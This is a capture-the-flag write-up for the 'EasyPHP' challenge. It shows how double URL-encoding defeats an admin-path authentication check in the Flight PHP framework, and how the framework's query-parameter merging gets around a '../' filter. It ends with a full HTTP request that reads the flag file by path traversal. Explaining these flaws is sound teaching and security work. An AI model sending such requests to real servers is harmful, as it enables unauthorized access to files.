# EasyPHP

## How to Setup Environment

`cd docker && docker-compose up -d`

## Write Up

After reading index.php we can know that 

1. Admin can read a file
2. Every route need authentication except login in `$request->url`
3.  `../` in `$_GET`,`$_POST`,`$_COOKIE`,`$_SESSION`  is not allowed

Read nginx.conf we know that

1. URL contains admin only can be accessed by 127.0.0.1
2. `REQUEST_URI` come from `$uri`, `$uri` is not URL decoded. PHP-FPM receives `$uri` and will urldecode it.

### Bypass Authentication

Our goal is obviously to bypass authentication to read a file, but within the above message, we can't do that.

So we need to read the flight framework.

In routing code, we can find an interesting thing that it will pass a URL decoded URL to the route function.

`$url_decoded = urldecode( $request->url );`

So we can bypass authentication by visit url path like `/%2561%2564%256d%2569%256e%3flogin=123`


### Bypass `../` limitation

But the flag is in /, so we need to bypass the `../` limitation.

The file to read come from `"./".$request->query->data`

But `../` limitation is working in `$_GET`, they may have some little difference.

Read about how `$request->query` is built.

It is first assigned value by the following code:

```php
'query' => new Collection($_GET)

class Collection{
    public function __construct(array $data = array()) {
        $this->data = $data;
    }   
}
```

But in init function overwrite query by

```PHP


    public function init(){
        ...
        // Default url
        if (empty($this->url)) {
            $this->url = '/';
        }
        // Merge URL query parameters with $_GET
        else {
            $_GET += self::parseQuery($this->url);

            $this->query->setData($_GET);
        }
        ...
    }
    public static function parseQuery($url) {
        $params = array();

        $args = parse_url($url);
        if (isset($args['query'])) {
            parse_str($args['query'], $params);
        }

        return $params;
    }

```

So it's time to bypass the limitation of `../`

### Exploit

```
GET /%2561%2564%256d%2569%256e%3flogin=123%26data=..%252f..%252f..%252f..%252fflag HTTP/1.1
Host: 127.0.0.1:60080
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close


```

